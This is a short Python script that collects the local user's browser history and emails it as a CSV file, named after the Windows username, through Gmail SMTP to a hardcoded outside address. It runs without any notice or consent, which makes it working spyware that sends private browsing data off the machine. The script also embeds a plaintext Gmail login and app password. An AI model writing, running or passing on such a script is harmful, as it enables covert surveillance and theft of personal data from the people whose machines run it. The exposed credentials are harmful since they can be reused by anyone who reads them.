from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import pandas as pd
import os
from browser_history import get_history

outputs = get_history()
his = outputs.histories


a=""
try:
        a=os.environ.get('USERNAME')
except:
        a="data"


df = pd.DataFrame(his, columns=['time', 'histry'])

def send_email(send_to, subject, df):
        send_from = "blinkdata4workshop@gmail.com"
        password = "icgrmsxxxssxikba"
        message = """\
        <p><strong>Histroy collection&nbsp;</strong></p>
        <p><br></p>
        <p><strong>Greetings&nbsp;</strong><br><strong>mathis&nbsp;    </strong></p>
        """
        for receiver in send_to:
                multipart = MIMEMultipart()
                multipart["From"] = send_from
                multipart["To"] = receiver
                multipart["Subject"] = subject
                attachment = MIMEApplication(df.to_csv())
                attachment["Content-Disposition"] = 'attachment; filename=" {}"'.format(f"{subject}.csv")
                multipart.attach(attachment)
                multipart.attach(MIMEText(message, "html"))
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls()
                server.login(multipart["From"], password)
                server.sendmail(multipart["From"], multipart["To"], multipart.as_string())
                server.quit()

send_email(["mathisit052@gmail.com"], a, df)

